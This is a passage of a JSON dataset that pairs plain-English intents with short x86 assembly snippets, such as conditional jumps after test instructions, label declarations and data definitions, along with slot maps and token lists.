      "var0",
      "\\n",
      "jnz",
      "var1"
    ]
  },
  {
    "intent": "jump to the label l1 if the contents of the eax register is not zero",
    "rewritten_intent": "jump to the label l1 if the contents of the eax register is not zero",
    "snippet": "test eax, eax \\n jnz l1",
    "slot_map": {
      "l1": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "jump",
      "label",
      "var0",
      "if",
      "contents",
      "var1",
      "register",
      "not",
      "zero"
    ],
    "snippet_tokens": [
      "test",
      "var1",
      ",",
      "var1",
      "\\n",
      "jnz",
      "var0"
    ]
  },
  {
    "intent": "if the contents of the eax register is not zero then jump to the label l1",
    "rewritten_intent": "if the contents of the eax register is not zero then jump to the label l1",
    "snippet": "test eax, eax \\n jnz l1",
    "slot_map": {
      "eax": "var0",
      "l1": "var1"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "not",
      "zero",
      "then",
      "jump",
      "label",
      "var1"
    ],
    "snippet_tokens": [
      "test",
      "var0",
      ",",
      "var0",
      "\\n",
      "jnz",
      "var1"
    ]
  },
  {
    "intent": "jump to the label l1 if the contents of the eax register is not zero else call the function myfunct",
    "rewritten_intent": "jump to the label l1 if the contents of the eax register is not zero else call the function myfunct",
    "snippet": "test eax, eax \\n jnz l1 \\n call myfunct",
    "slot_map": {
      "l1": "var0",
      "eax": "var1",
      "myfunct": "var2"
    },
    "intent_tokens": [
      "jump",
      "label",
      "var0",
      "if",
      "contents",
      "var1",
      "register",
      "not",
      "zero",
      "else",
      "call",
      "function",
      "var2"
    ],
    "snippet_tokens": [
      "test",
      "var1",
      ",",
      "var1",
      "\\n",
      "jnz",
      "var0",
      "\\n",
      "call",
      "var2"
    ]
  },
  {
    "intent": "if the contents of the eax register is not zero then jump to the label l1 else call the function myfunct",
    "rewritten_intent": "if the contents of the eax register is not zero then jump to the label l1 else call the function myfunct",
    "snippet": "test eax, eax \\n jnz l1 \\n call myfunct",
    "slot_map": {
      "eax": "var0",
      "l1": "var1",
      "myfunct": "var2"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "not",
      "zero",
      "then",
      "jump",
      "label",
      "var1",
      "else",
      "call",
      "function",
      "var2"
    ],
    "snippet_tokens": [
      "test",
      "var0",
      ",",
      "var0",
      "\\n",
      "jnz",
      "var1",
      "\\n",
      "call",
      "var2"
    ]
  },
  {
    "intent": "jump to the label l4 if the contents of the eax register is not zero else call the function search",
    "rewritten_intent": "jump to the label l4 if the contents of the eax register is not zero else call the function search",
    "snippet": "test eax, eax \\n jnz l4 \\n call search",
    "slot_map": {
      "l4": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "jump",
      "label",
      "var0",
      "if",
      "contents",
      "var1",
      "register",
      "not",
      "zero",
      "else",
      "call",
      "function",
      "search"
    ],
    "snippet_tokens": [
      "test",
      "var1",
      ",",
      "var1",
      "\\n",
      "jnz",
      "var0",
      "\\n",
      "call",
      "search"
    ]
  },
  {
    "intent": "if the contents of the eax register is not zero then jump to the label l4 else call the function search",
    "rewritten_intent": "if the contents of the eax register is not zero then jump to the label l4 else call the function search",
    "snippet": "test eax, eax \\n jnz l4 \\n call search",
    "slot_map": {
      "eax": "var0",
      "l4": "var1"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "not",
      "zero",
      "then",
      "jump",
      "label",
      "var1",
      "else",
      "call",
      "function",
      "search"
    ],
    "snippet_tokens": [
      "test",
      "var0",
      ",",
      "var0",
      "\\n",
      "jnz",
      "var1",
      "\\n",
      "call",
      "search"
    ]
  },
  {
    "intent": "jump short to the label _parent if the contents of the eax register is not zero",
    "rewritten_intent": "jump short to the label _parent if the contents of the eax register is not zero",
    "snippet": "test eax, eax \\n jnz short _parent",
    "slot_map": {
      "_parent": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "jump",
      "short",
      "label",
      "var0",
      "if",
      "contents",
      "var1",
      "register",
      "not",
      "zero"
    ],
    "snippet_tokens": [
      "test",
      "var1",
      ",",
      "var1",
      "\\n",
      "jnz",
      "short",
      "var0"
    ]
  },
  {
    "intent": "if the contents of the eax register is not zero then jump short to the label _parent",
    "rewritten_intent": "if the contents of the eax register is not zero then jump short to the label _parent",
    "snippet": "test eax, eax \\n jnz short _parent",
    "slot_map": {
      "eax": "var0",
      "_parent": "var1"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "not",
      "zero",
      "then",
      "jump",
      "short",
      "label",
      "var1"
    ],
    "snippet_tokens": [
      "test",
      "var0",
      ",",
      "var0",
      "\\n",
      "jnz",
      "short",
      "var1"
    ]
  },
  {
    "intent": "jump to the label _while_loop if the contents of the eax register is negative",
    "rewritten_intent": "jump to the label _while_loop if the contents of the eax register is negative",
    "snippet": "test eax, eax \\n js _while_loop",
    "slot_map": {
      "_while_loop": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "jump",
      "label",
      "var0",
      "if",
      "contents",
      "var1",
      "register",
      "negative"
    ],
    "snippet_tokens": [
      "test",
      "var1",
      ",",
      "var1",
      "\\n",
      "js",
      "var0"
    ]
  },
  {
    "intent": "if the contents of the eax register is negative then jump to the label _while_loop",
    "rewritten_intent": "if the contents of the eax register is negative then jump to the label _while_loop",
    "snippet": "test eax, eax \\n js _while_loop",
    "slot_map": {
      "eax": "var0",
      "_while_loop": "var1"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "negative",
      "then",
      "jump",
      "label",
      "var1"
    ],
    "snippet_tokens": [
      "test",
      "var0",
      ",",
      "var0",
      "\\n",
      "js",
      "var1"
    ]
  },
  {
    "intent": "jump to the label close if the contents of the eax register is negative",
    "rewritten_intent": "jump to the label close if the contents of the eax register is negative",
    "snippet": "test eax, eax \\n js close",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "jump",
      "label",
      "close",
      "if",
      "contents",
      "var0",
      "register",
      "negative"
    ],
    "snippet_tokens": [
      "test",
      "var0",
      ",",
      "var0",
      "\\n",
      "js",
      "close"
    ]
  },
  {
    "intent": "if the contents of the eax register is negative then jump to the label close",
    "rewritten_intent": "if the contents of the eax register is negative then jump to the label close",
    "snippet": "test eax, eax \\n js close",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "negative",
      "then",
      "jump",
      "label",
      "close"
    ],
    "snippet_tokens": [
      "test",
      "var0",
      ",",
      "var0",
      "\\n",
      "js",
      "close"
    ]
  },
  {
    "intent": "jump to the label old_dirent if the contents of the eax register is negative",
    "rewritten_intent": "jump to the label old_dirent if the contents of the eax register is negative",
    "snippet": "test eax, eax \\n js old_dirent",
    "slot_map": {
      "old_dirent": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "jump",
      "label",
      "var0",
      "if",
      "contents",
      "var1",
      "register",
      "negative"
    ],
    "snippet_tokens": [
      "test",
      "var1",
      ",",
      "var1",
      "\\n",
      "js",
      "var0"
    ]
  },
  {
    "intent": "if the contents of the eax register is negative then jump to the label old_dirent",
    "rewritten_intent": "if the contents of the eax register is negative then jump to the label old_dirent",
    "snippet": "test eax, eax \\n js old_dirent",
    "slot_map": {
      "old_dirent": "var1",
      "eax": "var0"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "negative",
      "then",
      "jump",
      "label",
      "var1"
    ],
    "snippet_tokens": [
      "test",
      "var0",
      ",",
      "var0",
      "\\n",
      "js",
      "var1"
    ]
  },
  {
    "intent": "jump short to the label socket if the contents of the eax register is negative",
    "rewritten_intent": "jump short to the label socket if the contents of the eax register is negative",
    "snippet": "test eax, eax \\n js short socket",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "jump",
      "short",
      "label",
      "socket",
      "if",
      "contents",
      "var0",
      "register",
      "negative"
    ],
    "snippet_tokens": [
      "test",
      "var0",
      ",",
      "var0",
      "\\n",
      "js",
      "short",
      "socket"
    ]
  },
  {
    "intent": "if the contents of the eax register is negative then jump short to the label socket",
    "rewritten_intent": "if the contents of the eax register is negative then jump short to the label socket",
    "snippet": "test eax, eax \\n js short socket",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "negative",
      "then",
      "jump",
      "short",
      "label",
      "socket"
    ],
    "snippet_tokens": [
      "test",
      "var0",
      ",",
      "var0",
      "\\n",
      "js",
      "short",
      "socket"
    ]
  },
  {
    "intent": "jump to the label check_html if the contents of the eax register is zero",
    "rewritten_intent": "jump to the label check_html if the contents of the eax register is zero",
    "snippet": "test eax, eax \\n jz check_html",
    "slot_map": {
      "check_html": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "jump",
      "label",
      "var0",
      "if",
      "contents",
      "var1",
      "register",
      "zero"
    ],
    "snippet_tokens": [
      "test",
      "var1",
      ",",
      "var1",
      "\\n",
      "jz",
      "var0"
    ]
  },
  {
    "intent": "if the contents of the eax register is zero then jump to the label check_html",
    "rewritten_intent": "if the contents of the eax register is zero then jump to the label check_html",
    "snippet": "test eax, eax \\n jz check_html",
    "slot_map": {
      "check_html": "var1",
      "eax": "var0"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "zero",
      "then",
      "jump",
      "label",
      "var1"
    ],
    "snippet_tokens": [
      "test",
      "var0",
      ",",
      "var0",
      "\\n",
      "jz",
      "var1"
    ]
  },
  {
    "intent": "jump to the label check_html if the contents of the eax register is zero else jump to the while label",
    "rewritten_intent": "jump to the label check_html if the contents of the eax register is zero else jump to the while label",
    "snippet": "test eax, eax \\n jz check_html \\n jmp while",
    "slot_map": {
      "check_html": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "jump",
      "label",
      "var0",
      "if",
      "contents",
      "var1",
      "register",
      "zero",
      "else",
      "jump",
      "while",
      "label"
    ],
    "snippet_tokens": [
      "test",
      "var1",
      ",",
      "var1",
      "\\n",
      "jz",
      "var0",
      "\\n",
      "jmp",
      "while"
    ]
  },
  {
    "intent": "if the contents of the eax register is zero then jump to the label check_html else jump to the while label",
    "rewritten_intent": "if the contents of the eax register is zero then jump to the label check_html else jump to the while label",
    "snippet": "test eax, eax \\n jz check_html \\n jmp while",
    "slot_map": {
      "check_html": "var1",
      "eax": "var0"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "zero",
      "then",
      "jump",
      "label",
      "var1",
      "else",
      "jump",
      "while",
      "label"
    ],
    "snippet_tokens": [
      "test",
      "var0",
      ",",
      "var0",
      "\\n",
      "jz",
      "var1",
      "\\n",
      "jmp",
      "while"
    ]
  },
  {
    "intent": "jump to the label close if the contents of the eax register is zero",
    "rewritten_intent": "jump to the label close if the contents of the eax register is zero",
    "snippet": "test eax, eax \\n jz close",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "jump",
      "label",
      "close",
      "if",
      "contents",
      "var0",
      "register",
      "zero"
    ],
    "snippet_tokens": [
      "test",
      "var0",
      ",",
      "var0",
      "\\n",
      "jz",
      "close"
    ]
  },
  {
    "intent": "if the contents of the eax register is zero then jump to the label close",
    "rewritten_intent": "if the contents of the eax register is zero then jump to the label close",
    "snippet": "test eax, eax \\n jz close",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "zero",
      "then",
      "jump",
      "label",
      "close"
    ],
    "snippet_tokens": [
      "test",
      "var0",
      ",",
      "var0",
      "\\n",
      "jz",
      "close"
    ]
  },
  {
    "intent": "jump to the label close if the contents of the eax register is zero else move the contents of the edx register into the ebx register",
    "rewritten_intent": "jump to the label close if the contents of the eax register is zero else move the contents of the edx register into the ebx register",
    "snippet": "test eax, eax \\n jz close \\n mov ebx, edx",
    "slot_map": {
      "eax": "var0",
      "edx": "var1",
      "ebx": "var2"
    },
    "intent_tokens": [
      "jump",
      "label",
      "close",
      "if",
      "contents",
      "var0",
      "register",
      "zero",
      "else",
      "move",
      "contents",
      "var1",
      "register",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "test",
      "var0",
      ",",
      "var0",
      "\\n",
      "jz",
      "close",
      "\\n",
      "mov",
      "var2",
      ",",
      "var1"
    ]
  },
  {
    "intent": "if the contents of the eax register is zero then jump to the label close else move the contents of the edx register into the ebx register",
    "rewritten_intent": "if the contents of the eax register is zero then jump to the label close else move the contents of the edx register into the ebx register",
    "snippet": "test eax, eax \\n jz close \\n mov ebx, edx",
    "slot_map": {
      "eax": "var0",
      "edx": "var1",
      "ebx": "var2"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "zero",
      "then",
      "jump",
      "label",
      "close",
      "else",
      "move",
      "contents",
      "var1",
      "register",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "test",
      "var0",
      ",",
      "var0",
      "\\n",
      "jz",
      "close",
      "\\n",
      "mov",
      "var2",
      ",",
      "var1"
    ]
  },
  {
    "intent": "jump to the label proc_name if the contents of the eax register is zero",
    "rewritten_intent": "jump to the label proc_name if the contents of the eax register is zero",
    "snippet": "test eax, eax \\n jz proc_name",
    "slot_map": {
      "proc_name": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "jump",
      "label",
      "var0",
      "if",
      "contents",
      "var1",
      "register",
      "zero"
    ],
    "snippet_tokens": [
      "test",
      "var1",
      ",",
      "var1",
      "\\n",
      "jz",
      "var0"
    ]
  },
  {
    "intent": "if the contents of the eax register is zero then jump to the label proc_name",
    "rewritten_intent": "if the contents of the eax register is zero then jump to the label proc_name",
    "snippet": "test eax, eax \\n jz proc_name",
    "slot_map": {
      "proc_name": "var1",
      "eax": "var0"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "zero",
      "then",
      "jump",
      "label",
      "var1"
    ],
    "snippet_tokens": [
      "test",
      "var0",
      ",",
      "var0",
      "\\n",
      "jz",
      "var1"
    ]
  },
  {
    "intent": "jump to the label ready_to_proxy if the contents of the eax register is zero",
    "rewritten_intent": "jump to the label ready_to_proxy if the contents of the eax register is zero",
    "snippet": "test eax, eax \\n jz ready_to_proxy",
    "slot_map": {
      "ready_to_proxy": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "jump",
      "label",
      "var0",
      "if",
      "contents",
      "var1",
      "register",
      "zero"
    ],
    "snippet_tokens": [
      "test",
      "var1",
      ",",
      "var1",
      "\\n",
      "jz",
      "var0"
    ]
  },
  {
    "intent": "if the contents of the eax register is zero then jump to the label ready_to_proxy",
    "rewritten_intent": "if the contents of the eax register is zero then jump to the label ready_to_proxy",
    "snippet": "test eax, eax \\n jz ready_to_proxy",
    "slot_map": {
      "ready_to_proxy": "var1",
      "eax": "var0"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "zero",
      "then",
      "jump",
      "label",
      "var1"
    ],
    "snippet_tokens": [
      "test",
      "var0",
      ",",
      "var0",
      "\\n",
      "jz",
      "var1"
    ]
  },
  {
    "intent": "jump short to the memory location loc_402B13 if the contents of the eax register is zero",
    "rewritten_intent": "jump short to the memory location loc_402B13 if the contents of the eax register is zero",
    "snippet": "test eax, eax \\n jz short loc_402B13",
    "slot_map": {
      "loc_402B13": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "jump",
      "short",
      "memory",
      "location",
      "var0",
      "if",
      "contents",
      "var1",
      "register",
      "zero"
    ],
    "snippet_tokens": [
      "test",
      "var1",
      ",",
      "var1",
      "\\n",
      "jz",
      "short",
      "var0"
    ]
  },
  {
    "intent": "if the contents of the eax register is zero then jump short to the memory location loc_402B13",
    "rewritten_intent": "if the contents of the eax register is zero then jump short to the memory location loc_402B13",
    "snippet": "test eax, eax \\n jz short loc_402B13",
    "slot_map": {
      "loc_402B13": "var1",
      "eax": "var0"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "zero",
      "then",
      "jump",
      "short",
      "memory",
      "location",
      "var1"
    ],
    "snippet_tokens": [
      "test",
      "var0",
      ",",
      "var0",
      "\\n",
      "jz",
      "short",
      "var1"
    ]
  },
  {
    "intent": "jump short to the memory location loc_402C13 if the contents of the eax register is zero",
    "rewritten_intent": "jump short to the memory location loc_402C13 if the contents of the eax register is zero",
    "snippet": "test eax, eax \\n jz short loc_402C13",
    "slot_map": {
      "loc_402C13": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "jump",
      "short",
      "memory",
      "location",
      "var0",
      "if",
      "contents",
      "var1",
      "register",
      "zero"
    ],
    "snippet_tokens": [
      "test",
      "var1",
      ",",
      "var1",
      "\\n",
      "jz",
      "short",
      "var0"
    ]
  },
  {
    "intent": "if the contents of the eax register is zero then jump short to the memory location loc_402C13",
    "rewritten_intent": "if the contents of the eax register is zero then jump short to the memory location loc_402C13",
    "snippet": "test eax, eax \\n jz short loc_402C13",
    "slot_map": {
      "loc_402C13": "var1",
      "eax": "var0"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "zero",
      "then",
      "jump",
      "short",
      "memory",
      "location",
      "var1"
    ],
    "snippet_tokens": [
      "test",
      "var0",
      ",",
      "var0",
      "\\n",
      "jz",
      "short",
      "var1"
    ]
  },
  {
    "intent": "jump to the label socket if the contents of the eax register is zero",
    "rewritten_intent": "jump to the label socket if the contents of the eax register is zero",
    "snippet": "test eax, eax \\n jz socket",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "jump",
      "label",
      "socket",
      "if",
      "contents",
      "var0",
      "register",
      "zero"
    ],
    "snippet_tokens": [
      "test",
      "var0",
      ",",
      "var0",
      "\\n",
      "jz",
      "socket"
    ]
  },
  {
    "intent": "jump to the label socket if the contents of the eax register is zero else zero out the contents of the eax register",
    "rewritten_intent": "jump to the label socket if the contents of the eax register is zero else zero out the contents of the eax register",
    "snippet": "test eax, eax \\n jz socket \\n xor eax, eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "jump",
      "label",
      "socket",
      "if",
      "contents",
      "var0",
      "register",
      "zero",
      "else",
      "zero",
      "out",
      "contents",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "test",
      "var0",
      ",",
      "var0",
      "\\n",
      "jz",
      "socket",
      "\\n",
      "xor",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "if the contents of the eax register is zero then jump to the label socket else zero out the contents of the eax register",
    "rewritten_intent": "if the contents of the eax register is zero then jump to the label socket else zero out the contents of the eax register",
    "snippet": "test eax, eax \\n jz socket \\n xor eax, eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "zero",
      "then",
      "jump",
      "label",
      "socket",
      "else",
      "zero",
      "out",
      "contents",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "test",
      "var0",
      ",",
      "var0",
      "\\n",
      "jz",
      "socket",
      "\\n",
      "xor",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "jump to the label write if the contents of the eax register is zero, else zero out the contents of the eax register",
    "rewritten_intent": "jump to the label write if the contents of the eax register is zero, else zero out the contents of the eax register",
    "snippet": "test eax, eax \\n jz write \\n xor eax, eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "jump",
      "label",
      "write",
      "if",
      "contents",
      "var0",
      "register",
      "zero",
      ",",
      "else",
      "zero",
      "out",
      "contents",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "test",
      "var0",
      ",",
      "var0",
      "\\n",
      "jz",
      "write",
      "\\n",
      "xor",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "if the contents of the eax register is zero then jump to the label write else zero out the contents of the eax register",
    "rewritten_intent": "if the contents of the eax register is zero then jump to the label write else zero out the contents of the eax register",
    "snippet": "test eax, eax \\n jz write \\n xor eax, eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "zero",
      "then",
      "jump",
      "label",
      "write",
      "else",
      "zero",
      "out",
      "contents",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "test",
      "var0",
      ",",
      "var0",
      "\\n",
      "jz",
      "write",
      "\\n",
      "xor",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "test the contents of the ebx register",
    "rewritten_intent": "test the contents of the ebx register",
    "snippet": "test ebx, ebx",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "test",
      "contents",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "test",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "test the contents of the ecx register",
    "rewritten_intent": "test the contents of the ecx register",
    "snippet": "test ecx, ecx",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "test",
      "contents",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "test",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "perform and operation between si and 01h",
    "rewritten_intent": "perform and operation between si and 01h",
    "snippet": "test si, 01h",
    "slot_map": {},
    "intent_tokens": [
      "perform",
      "and",
      "operation",
      "si",
      "and",
      "01h"
    ],
    "snippet_tokens": [
      "test",
      "si",
      ",",
      "01h"
    ]
  },
  {
    "intent": "declare the three label",
    "rewritten_intent": "declare the three label",
    "snippet": "three:",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "three",
      "label"
    ],
    "snippet_tokens": [
      "three",
      ":"
    ]
  },
  {
    "intent": "declare the todo label",
    "rewritten_intent": "declare the todo label",
    "snippet": "todo:",
    "slot_map": {
      "todo": "var0"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define constant total_students equal to 50",
    "rewritten_intent": "define constant total_students equal to 50",
    "snippet": "total_students equ 50",
    "slot_map": {
      "total_students": "var0"
    },
    "intent_tokens": [
      "define",
      "constant",
      "var0",
      "equal",
      "50"
    ],
    "snippet_tokens": [
      "var0",
      "equ",
      "50"
    ]
  },
  {
    "intent": "define two label",
    "rewritten_intent": "define two label",
    "snippet": "two:",
    "slot_map": {},
    "intent_tokens": [
      "define",
      "two",
      "label"
    ],
    "snippet_tokens": [
      "two",
      ":"
    ]
  },
  {
    "intent": "declare the two label",
    "rewritten_intent": "declare the two label",
    "snippet": "two:",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "two",
      "label"
    ],
    "snippet_tokens": [
      "two",
      ":"
    ]
  },
  {
    "intent": "declare the up label",
    "rewritten_intent": "declare the up label",
    "snippet": "up:",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "up",
      "label"
    ],
    "snippet_tokens": [
      "up",
      ":"
    ]
  },
  {
    "intent": "declare var byte variable and initialize it to 32",
    "rewritten_intent": "declare var byte variable and initialize it to 32",
    "snippet": "var db 32",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "var",
      "byte",
      "variable",
      "and",
      "initialize",
      "it",
      "32"
    ],
    "snippet_tokens": [
      "var",
      "db",
      "32"
    ]
  },
  {
    "intent": "declare a byte containing the value 64 at label the memory location var",
    "rewritten_intent": "declare a byte containing the value 64 at label the memory location var",
    "snippet": "var db 64",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "byte",
      "containing",
      "value",
      "64",
      "label",
      "memory",
      "location",
      "var"
    ],
    "snippet_tokens": [
      "var",
      "db",
      "64"
    ]
  },
  {
    "intent": "allocate one byte of memory for var_a variable and initialize it to 232",
    "rewritten_intent": "allocate one byte of memory for var_a variable and initialize it to 232",
    "snippet": "var_a db 232",
    "slot_map": {
      "var_a": "var1",
      "for": "var0"
    },
    "intent_tokens": [
      "allocate",
      "one",
      "byte",
      "memory",
      "var0",
      "var1",
      "variable",
      "and",
      "initialize",
      "it",
      "232"
    ],
    "snippet_tokens": [
      "var1",
      "db",
      "232"
    ]
  },
  {
    "intent": "create the doubleword variable var_a in memory and initialize it to zero",
    "rewritten_intent": "create the doubleword variable var_a in memory and initialize it to zero",
    "snippet": "var_a: dd 0x0",
    "slot_map": {
      "var_a": "var0"
    },
    "intent_tokens": [
      "create",
      "doubleword",
      "variable",
      "var0",
      "memory",
      "and",
      "initialize",
      "it",
      "zero"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "dd",
      "0x0"
    ]
  },
  {
    "intent": "allocate one byte of memory for var_b variable and initialize it to 'c'",
    "rewritten_intent": "allocate one byte of memory for var_b variable and initialize it to 'c'",
    "snippet": "var_b db 'c'",
    "slot_map": {
      "'c'": "var3",
      "var_b": "var1",
      "for": "var0"
    },
    "intent_tokens": [
      "allocate",
      "one",
      "byte",
      "memory",
      "var0",
      "var1",
      "variable",
      "and",
      "initialize",
      "it",
      "var3"
    ],
    "snippet_tokens": [
      "var1",
      "db",
      "var3"
    ]
  },
  {
    "intent": "declare an uninitialized byte labeled var2",
    "rewritten_intent": "declare an uninitialized byte labeled var2",
    "snippet": "var2 db ?",
    "slot_map": {
      "uninitialized": "var0",
      "var2": "var1"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "byte",
      "labeled",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "db",
      "?"
    ]
  },
  {
    "intent": "declare an uninitialized byte referred to as location var2",
    "rewritten_intent": "declare an uninitialized byte referred to as location var2",
    "snippet": "var2 db ?",
    "slot_map": {
      "uninitialized": "var0",
      "var2": "var1"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "byte",
      "referred",
      "location",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "db",
      "?"
    ]
  },
  {
    "intent": "reserve 1 byte for variableName1",
    "rewritten_intent": "reserve 1 byte for variableName1",
    "snippet": "variablename1: resb 1",
    "slot_map": {
      "variableName1": "var1",
      "for": "var0"
    },
    "intent_tokens": [
      "reserve",
      "1",
      "byte",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "variablename1",
      ":",
      "resb",
      "1"
    ]
  },
  {
    "intent": "reserve 1 word for variableName2",
    "rewritten_intent": "reserve 1 word for variableName2",
    "snippet": "variablename2: resw 1",
    "slot_map": {
      "variableName2": "var1",
      "for": "var0"
    },
    "intent_tokens": [
      "reserve",
      "1",
      "word",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "variablename2",
      ":",
      "resw",
      "1"
    ]
  },
  {
    "intent": "reserve 1 double word for variableName3",
    "rewritten_intent": "reserve 1 double word for variableName3",
    "snippet": "variablename3: resd 1",
    "slot_map": {
      "variableName3": "var1",
      "for": "var0"
    },
    "intent_tokens": [
      "reserve",
      "1",
      "double",
      "word",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "variablename3",
      ":",
      "resd",
      "1"
    ]
  },
  {
    "intent": "declare the array of words word_table initialized to 134 345 564 and 123",
    "rewritten_intent": "declare the array of words word_table initialized to 134 345 564 and 123",
    "snippet": "word_table dw 134, 345, 564, 123",
    "slot_map": {
      "word_table": "var0"
    },
    "intent_tokens": [
      "declare",
      "array",
      "words",
      "var0",
      "initialized",
      "134",
      "345",
      "564",
      "and",
      "123"
    ],
    "snippet_tokens": [
      "var0",
      "dw",
      "134",
      ",",
      "345",
      ",",
      "564",
      ",",
      "123"
    ]
  },
  {
    "intent": "define the word value word_value and initialize it to 300",
    "rewritten_intent": "define the word value word_value and initialize it to 300",
    "snippet": "word_value dw 300",
    "slot_map": {
      "word_value": "var0"
    },
    "intent_tokens": [
      "define",
      "word",
      "value",
      "var0",
      "and",
      "initialize",
      "it",
      "300"
    ],
    "snippet_tokens": [
      "var0",
      "dw",
      "300"
    ]
  },
  {
    "intent": "define word1 unsigned word and initialize it to 65535",
    "rewritten_intent": "define word1 unsigned word and initialize it to 65535",
    "snippet": "word1 word 65535",
    "slot_map": {
      "word1": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "unsigned",
      "word",
      "and",
      "initialize",
      "it",
      "65535"
    ],
    "snippet_tokens": [
      "var0",
      "word",
      "65535"
    ]
  },
  {
    "intent": "define word2 signed word and initialize it to -32768",
    "rewritten_intent": "define word2 signed word and initialize it to -32768",
    "snippet": "word2 sword \u201332768",
    "slot_map": {
      "to -32768": "var1",
      "word2": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "signed",
      "word",
      "and",
      "initialize",
      "it",
      "-32768"
    ],
    "snippet_tokens": [
      "var0",
      "sword",
      "\u201332768"
    ]
  },
  {
    "intent": "define word3 uninitialized unsigned word",
    "rewritten_intent": "define word3 uninitialized unsigned word",
    "snippet": "word3 word ?",
    "slot_map": {
      "word3": "var0",
      "uninitialized": "var1"
    },
    "intent_tokens": [
      "define",
      "var0",
      "var1",
      "unsigned",
      "word"
    ],
    "snippet_tokens": [
      "var0",
      "word",
      "?"
    ]
  },
  {
    "intent": "reserve a word for wordvar",
    "rewritten_intent": "reserve a word for wordvar",
    "snippet": "wordvar: resw 1",
    "slot_map": {
      "for": "var0",
      "wordvar": "var1"
    },
    "intent_tokens": [
      "reserve",
      "word",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      ":",
      "resw",
      "1"
    ]
  },
  {
    "intent": "declare the wrap_around label",
    "rewritten_intent": "declare the wrap_around label",
    "snippet": "wrap_around:",
    "slot_map": {
      "wrap_around": "var0"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define write_syscall equal to 4",
    "rewritten_intent": "define write_syscall equal to 4",
    "snippet": "write_syscall equ 4",
    "slot_map": {
      "write_syscall": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "equal",
      "4"
    ],
    "snippet_tokens": [
      "var0",
      "equ",
      "4"
    ]
  },
  {
    "intent": "declare the write label",
    "rewritten_intent": "declare the write label",
    "snippet": "write:",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "write",
